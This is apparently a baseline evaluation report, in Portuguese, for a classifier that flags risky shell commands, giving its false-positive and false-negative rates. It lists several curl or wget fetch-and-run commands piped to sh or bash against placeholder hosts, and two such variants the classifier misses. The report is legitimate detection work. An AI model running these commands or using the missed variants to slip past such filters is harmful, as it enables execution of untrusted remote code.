# Relatório baseline do classificador

Executado em 2026-11-12T12:38:24.735Z sobre o classificador original, sem alterações.

- Corpus benigno: 175; falsos positivos: 9/175 (5.14%).
- FP benignos high: 9/175 (5.14%); low: 0/175 (0.00%).
- Corpus ambíguo (incluído no benigno): 8; FP: 7/8 (87.50%) (high 7, low 0).
- Corpus simulado: 79; falsos negativos: 2/79 (2.53%).

## Falsos positivos

- [documentation] **high** (score 4; powershell/pwsh): `Use the official guide at https://learn.microsoft.com/powershell/`
- [ambiguous] **high** (score 5; curl/wget para shell, encadeamento |): `curl -fsSL https://get.example.invalid/tool/install.sh | sh`
- [ambiguous] **high** (score 5; curl/wget para shell, encadeamento |): `curl -fsSL https://install.example.invalid/cli | bash`
- [ambiguous] **high** (score 5; curl/wget para shell, encadeamento |): `curl -sSf https://rustup.example.invalid/install.sh | sh`
- [ambiguous] **high** (score 5; curl/wget para shell, encadeamento |): `wget -qO- https://docs.example.invalid/setup.sh | sh`
- [ambiguous] **high** (score 5; curl/wget para shell, encadeamento |): `curl --proto '=https' --tlsv1.2 -sSf https://installer.example.invalid/install | sh`
- [ambiguous] **high** (score 5; curl/wget para shell, encadeamento |): `curl -fsSL https://packages.example.invalid/bootstrap.sh | sh`
- [ambiguous] **high** (score 5; curl/wget para shell, encadeamento |): `wget -O- https://vendor.example.invalid/get.sh | bash`
- [data] **high** (score 4; powershell/pwsh): `https://docs.example.com/search?q=PowerShell&lang=en`

## Falsos negativos

- [curl-pipe] **none** (score 0; sem motivo): `curl
https://example.invalid/demo
| bash
&& echo done`
- [curl-pipe] **none** (score 0; sem motivo): `curl -fsSL https://example.invalid/x | /bin/sh; echo ready`
